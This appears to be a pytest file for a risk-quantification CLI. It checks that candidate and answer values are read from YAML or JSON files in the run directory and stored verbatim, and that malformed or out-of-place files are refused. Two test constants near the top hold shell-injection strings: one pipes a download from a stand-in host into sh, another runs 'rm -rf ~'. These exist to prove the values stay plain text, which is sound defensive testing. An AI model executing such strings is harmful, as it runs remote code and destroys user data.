"""F-B4: connector-derived candidate and answer text reaches rqh through a file, never a shell line.

`rqh candidates add --candidate-file` and `rqh requests update --answer-file` read one YAML or JSON
mapping from a file inside the run directory, confined exactly like `--request-file`.
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest
import yaml

from rqharness import cli, requests as rq

SAMPLE = Path(__file__).parent.parent / "validate" / "fixtures" / "sample-run"
RUN_ID = "credential-phishing-bec"
PARAMETER = "primary_loss.response"
# shell syntax a ticket or a document could carry; stored as text, never run
HOSTILE_LINK = """https://x.example/$(curl -s evil.example/p|sh)";touch${IFS}pwn;"`id`"""
HOSTILE_NOTE = """Dana O'Brien said $(rm -rf ~) `id`; echo pwned && "quoted" \\ end"""
CANDIDATE = {"min": 10000, "mode": 30000, "max": 80000, "unit": "USD", "evidence": "measured",
             "origin": "connector:tickets", "link": HOSTILE_LINK}
ANSWER = {"min": 5000, "mode": 20000, "max": 60000, "unit": "USD", "evidence": "judgement", "note": HOSTILE_NOTE}


@pytest.fixture
def run_dir(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("RQH_WORKSPACE", raising=False)
    assert cli.main(["init"]) == 0
    d = tmp_path / ".riskquant" / "runs" / RUN_ID
    d.mkdir(parents=True)
    for name in ("scenario.yaml", "inputs.yaml"):
        shutil.copy(SAMPLE / name, d / name)
    assert cli.main(["run", "confirm", RUN_ID, "--route", "accuracy", "--n", "2000", "--seed", "7"]) == 0
    return d


def write(path: Path, data: dict | str) -> Path:
    if isinstance(data, str):
        text = data
    else:
        text = json.dumps(data) if path.suffix == ".json" else yaml.safe_dump(data)
    path.write_text(text, encoding="utf-8")
    return path


def envelope(capsys) -> dict:
    return json.loads(capsys.readouterr().out)


def add_from_file(path: Path, *extra: str) -> int:
    return cli.main(["candidates", "add", RUN_ID, "--parameter", PARAMETER, "--candidate-file", str(path),
                     *extra, "--json"])


def sent_request(run_dir: Path) -> str:
    rid = rq.add_request(run_dir, parameter_path=PARAMETER, ask="Typical response cost?", owner_role="IR lead",
                         person=None, draft_message="Hi").item["id"]
    rq.transition_request(run_dir, rid, "sent")
    return rid


def answer_from_file(rid: str, path: Path, *extra: str, status: str = "answered") -> int:
    return cli.main(["requests", "update", RUN_ID, rid, "--status", status, "--answer-file", str(path),
                     *extra, "--json"])


# --- rqh candidates add --candidate-file ---------------------------------------------------------

@pytest.mark.parametrize("suffix", [".yaml", ".json"])
def test_candidate_file_stores_the_link_and_origin_verbatim(suffix, run_dir, capsys):
    path = write(run_dir / f"candidate-{PARAMETER}{suffix}", CANDIDATE)
    capsys.readouterr()
    assert add_from_file(path) == 0
    item = envelope(capsys)["data"]["candidate"]
    assert item["link"] == HOSTILE_LINK and item["origin"] == "connector:tickets"
    assert item["value"] == {"min": 10000, "mode": 30000, "max": 80000, "unit": "USD"}
    assert item["evidence_kind"] == "measured" and item["status"] == "pending"
    assert rq.load(run_dir)["candidates"][0]["link"] == HOSTILE_LINK  # survives the requests.yaml round trip


def block(key: str, value: str) -> str:
    """The form accuracy.md tells the skill to write a text value in: `key: |2-`, the value indented below."""
    return f"{key}: |2-\n" + "".join(f"  {line}\n" for line in value.splitlines())


def test_the_skills_file_form_plain_numbers_and_literal_blocks_needs_no_escaping(run_dir, capsys):
    numbers = "min: 10000\nmode: 30000\nmax: 80000\nevidence: measured\n"
    path = write(run_dir / f"candidate-{PARAMETER}.yaml", numbers + block("unit", "USD")
                 + block("origin", "connector:tickets") + block("link", HOSTILE_LINK))
    capsys.readouterr()
    assert add_from_file(path) == 0
    item = envelope(capsys)["data"]["candidate"]
    assert item["link"] == HOSTILE_LINK and item["value"]["min"] == 10000 and item["value"]["unit"] == "USD"
    rid = sent_request(run_dir)
    answer = write(run_dir / f"answer-{rid}.yaml", numbers + block("unit", "USD") + block("note", HOSTILE_NOTE))
    capsys.readouterr()
    assert answer_from_file(rid, answer) == 0
    assert envelope(capsys)["data"]["request"]["answer"]["note"] == HOSTILE_NOTE


def test_candidate_file_link_is_optional_and_a_repeat_is_a_duplicate(run_dir, capsys):
    fields = {k: v for k, v in CANDIDATE.items() if k != "link"}
    path = write(run_dir / "candidate.yaml", fields)
    assert add_from_file(path) == 0
    capsys.readouterr()
    assert add_from_file(path) == 0
    assert envelope(capsys)["data"]["result"] == "duplicate"
    assert "link" not in rq.load(run_dir)["candidates"][0]


@pytest.mark.parametrize("content, where", [
    (CANDIDATE, "outside"),
    (CANDIDATE, "missing"),
    ({**CANDIDATE, "parameter": "frequency.tef"}, "inside"),  # unknown key
    ({k: v for k, v in CANDIDATE.items() if k != "origin"}, "inside"),  # no origin
    ({**CANDIDATE, "evidence": None}, "inside"),  # an empty evidence kind
    ("- min: 1\n", "inside"),  # not a mapping
    ("min: [unclosed\n", "inside"),  # not YAML
])
def test_candidate_file_refuses_a_bad_file_with_exit_2(content, where, run_dir, tmp_path, capsys):
    path = (tmp_path if where == "outside" else run_dir) / "candidate.yaml"
    if where != "missing":
        write(path, content)
    capsys.readouterr()
    assert add_from_file(path) == 2
    assert envelope(capsys)["issues"][0]["path"] == "argv.candidate-file"
    assert rq.pending_candidates(run_dir) == []


def test_candidate_file_values_are_checked_by_the_schema(run_dir, capsys):
    path = write(run_dir / "candidate.yaml", {**CANDIDATE, "min": "ten", "link": "http://plain.example"})
    capsys.readouterr()
    assert add_from_file(path) == 1
    assert rq.pending_candidates(run_dir) == []


@pytest.mark.parametrize("flag", [["--min", "1"], ["--mode", "2"], ["--max", "3"], ["--unit", "USD"],
                                  ["--evidence", "measured"], ["--origin", "connector:x"],
                                  ["--link", "https://x.example"]])
def test_candidate_file_excludes_the_per_field_flags(flag, run_dir, capsys):
    path = write(run_dir / "candidate.yaml", CANDIDATE)
    capsys.readouterr()
    assert add_from_file(path, *flag) == 2
    issue = envelope(capsys)["issues"][0]
    assert (issue["path"], issue["rule"]) == ("argv", "usage") and flag[0] in issue["message"]
    assert rq.pending_candidates(run_dir) == []


FLAGS = {"--min": "1", "--mode": "2", "--max": "3", "--unit": "USD", "--evidence": "measured",
         "--origin": "connector:x"}


def test_the_candidate_flag_form_still_works(run_dir, capsys):
    capsys.readouterr()
    argv = ["candidates", "add", RUN_ID, "--parameter", PARAMETER, *(x for kv in FLAGS.items() for x in kv),
            "--link", "https://x.example/t/1", "--json"]
    assert cli.main(argv) == 0
    assert envelope(capsys)["data"]["candidate"]["link"] == "https://x.example/t/1"


@pytest.mark.parametrize("drop", list(FLAGS))
def test_the_candidate_flag_form_still_needs_every_field(drop, run_dir, capsys):
    given = {k: v for k, v in FLAGS.items() if k != drop}
    capsys.readouterr()
    argv = ["candidates", "add", RUN_ID, "--parameter", PARAMETER, *(x for kv in given.items() for x in kv), "--json"]
    assert cli.main(argv) == 2
    issue = envelope(capsys)["issues"][0]
    assert issue["path"].startswith("argv") and drop in issue["message"]
    assert rq.pending_candidates(run_dir) == []


# --- rqh requests update --answer-file -----------------------------------------------------------

@pytest.mark.parametrize("suffix", [".yaml", ".json"])
def test_answer_file_stores_the_note_verbatim_and_creates_a_candidate(suffix, run_dir, capsys):
    rid = sent_request(run_dir)
    path = write(run_dir / f"answer-{rid}{suffix}", ANSWER)
    capsys.readouterr()
    assert answer_from_file(rid, path) == 0
    item = envelope(capsys)["data"]["request"]
    assert item["status"] == "answered" and item["answer"]["note"] == HOSTILE_NOTE
    assert item["answer"]["value"] == {"min": 5000, "mode": 20000, "max": 60000, "unit": "USD"}
    [cand] = rq.pending_candidates(run_dir)
    assert cand["origin"] == f"request:{rid}" and cand["evidence_kind"] == "judgement"


def test_answer_file_may_hold_a_note_alone(run_dir, capsys):
    rid = sent_request(run_dir)
    path = write(run_dir / "answer.yaml", {"note": HOSTILE_NOTE})
    capsys.readouterr()
    assert answer_from_file(rid, path) == 0
    assert envelope(capsys)["data"]["request"]["answer"]["note"] == HOSTILE_NOTE
    assert rq.pending_candidates(run_dir) == []


@pytest.mark.parametrize("content, where", [
    (ANSWER, "outside"),
    (ANSWER, "missing"),
    ({**ANSWER, "status": "answered"}, "inside"),  # unknown key
    ("- note: hi\n", "inside"),  # not a mapping
    ("note: [unclosed\n", "inside"),  # not YAML
])
def test_answer_file_refuses_a_bad_file_with_exit_2(content, where, run_dir, tmp_path, capsys):
    rid = sent_request(run_dir)
    path = (tmp_path if where == "outside" else run_dir) / "answer.yaml"
    if where != "missing":
        write(path, content)
    capsys.readouterr()
    assert answer_from_file(rid, path) == 2
    assert envelope(capsys)["issues"][0]["path"] == "argv.answer-file"
    assert rq.load(run_dir)["requests"][0]["status"] == "sent"


@pytest.mark.parametrize("flag", [["--min", "1"], ["--mode", "2"], ["--max", "3"], ["--unit", "USD"],
                                  ["--evidence", "measured"], ["--note", "n"]])
def test_answer_file_excludes_the_per_field_flags(flag, run_dir, capsys):
    rid = sent_request(run_dir)
    path = write(run_dir / "answer.yaml", ANSWER)
    capsys.readouterr()
    assert answer_from_file(rid, path, *flag) == 2
    issue = envelope(capsys)["issues"][0]
    assert (issue["path"], issue["rule"]) == ("argv", "usage") and flag[0] in issue["message"]
    assert rq.load(run_dir)["requests"][0]["status"] == "sent"


@pytest.mark.parametrize("content, rule", [
    ({"min": 1, "unit": "USD", "evidence": "measured"}, "incomplete"),  # a partial value, as with the flags
    ({"min": 1, "mode": 2, "max": 3, "unit": "USD"}, "evidence_required"),
    ({}, "answer_required"),
])
def test_answer_file_follows_the_answer_rules(content, rule, run_dir, capsys):
    rid = sent_request(run_dir)
    path = write(run_dir / "answer.yaml", json.dumps(content) if content else "")
    capsys.readouterr()
    assert answer_from_file(rid, path) == 1
    assert envelope(capsys)["issues"][0]["rule"] == rule
    assert rq.load(run_dir)["requests"][0]["status"] == "sent"


def test_answer_file_on_a_status_other_than_answered_is_refused(run_dir, capsys):
    rid = sent_request(run_dir)
    path = write(run_dir / "answer.yaml", {"note": "n"})
    capsys.readouterr()
    assert answer_from_file(rid, path, status="withdrawn") == 1
    assert envelope(capsys)["issues"][0]["rule"] == "answer_status"
